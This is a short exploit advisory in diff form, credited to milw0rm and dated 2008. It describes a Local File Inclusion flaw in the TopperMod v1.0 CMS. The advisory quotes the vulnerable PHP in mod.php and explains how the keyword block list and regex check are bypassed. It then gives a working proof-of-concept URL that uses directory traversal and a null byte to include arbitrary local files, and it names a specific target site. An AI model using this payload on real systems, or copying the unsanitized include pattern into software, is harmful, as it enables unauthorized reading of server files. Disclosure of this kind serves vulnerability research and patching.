@@ -1,0 +1,45 @@
+# Author:	__GiReX__
+# mySite:	girex.altervista.org
+
+# CMS: 		TopperMod v1.0
+# Site:		rtcw.ch/mio/index.php
+
+# Bug: 		Local File Inclusion
+# File: 	mod.php
+# Var :		$to
+
+
+# Bug explanation - Vuln Code:
+
+	if (isset($_GET['mod'])) { $mod = stripslashes($_GET['mod']); } else { header("location index.php"); Die(); }
+	if (isset($_GET['to'])) { $to = stripslashes($_GET['to']); } else { $to="index"; }
+
+# Our bugged vars are GET's var so we don't need Register_Globals turned On
+ 
+ 
+	$vietate=array("http","select","union","where","delete","insert","alert","document");
+		if (ereg($vietate,strtolower($mod)) OR ereg($vietate,strtolower($to)) ) { 
+	 		echo "<META HTTP-EQUIV=\"refresh\" content=\"1;URL=index.php\">";
+		} elseif (ereg("[a-zA-Z0-9]",$mod) OR ereg("[a-zA-Z0-9]",$to)) {
+
+# Our exploitation don't use a $vietate word and
+# the check of ereg() return true if we use some letters
+
+
+  ...
+# ... we must be logged in and $mod must be a real section
+  ...
+
+
+	if (file_exists("mod/$mod/".$to.".php") ) {
+		include("mod/$mod/".$to.".php");
+	} else {
+		echo "<META HTTP-EQUIV=\"refresh\" content=\"1;URL=index.php\">";
+				}
+
+# var $to is not sanizated so we can exploit thought Local File Inclusion
+
+
+PoC:  [host]/[path]/mod.php?mod=account&to=../../[local file]%00
+
+# milw0rm.com [2008-03-25]
